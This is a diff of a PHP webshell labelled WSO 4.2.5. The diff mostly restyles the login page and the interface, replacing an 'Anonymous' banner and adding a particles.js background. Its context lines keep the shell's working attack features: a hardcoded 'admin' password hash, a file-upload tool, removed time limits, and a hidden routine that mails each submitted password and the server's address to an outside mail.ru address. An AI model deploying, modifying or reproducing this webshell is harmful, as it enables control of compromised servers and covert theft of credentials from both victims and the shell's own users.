@@ -1,7 +1,7 @@
 ﻿<?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	 $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
 $▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
@@ -27,7 +27,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.2.4');
+@define('VERSION', '4.2.5');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -53,7 +53,7 @@ function hardLogin() {
 		  exit;
 		  }
 		}
-	die("<pre align=center><form method=post style='font-family:fantasy;'>Hello Friend<br>We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us!<br><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#1e252e;color:#fff;cursor:pointer;'></form></pre>");
+	die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#FFDB5F;color:#fff;cursor:pointer;'></form></pre>");
 }
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
@@ -79,9 +79,11 @@ function hardHeader() {
 		$_POST['charset'] = $GLOBALS['▜'];
 	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
 <style>
-	body {background-color:#060a10;color:#e1e1e1;}
+	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
+	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
 	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
-	table.info	{color:#C3C3C3;background-color:#060a10;}
+	table.info	{color:#C3C3C3;}
+	table#toolsTbl {background-color: #060A10;}
 	span,h1,a	{color:#fff !important;}
 	span		{font-weight:bolder;}
 	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
@@ -168,7 +170,7 @@ function hardHeader() {
 			} else alert('Request error!');
 	}
 </script>
-<head><body><div style='position:absolute;width:100%;background-color:#1e252e;top:0;left:0;'>
+<head><body><div style='position:absolute;width:100%;top:0;left:0;'>
 <form method=post name=mf style='display:none;'>
 <input type=hidden name=a>
 <input type=hidden name=c>
@@ -252,7 +254,10 @@ function hardFooter() {
 		<input type=hidden name=ne value=''>
 		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
 		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='>>'></form><br  ></td>
-	</tr></table></div></body></html>";
+	</tr></table></div>
+	<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
+	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
+	</body></html>";
 }
 if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
 if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
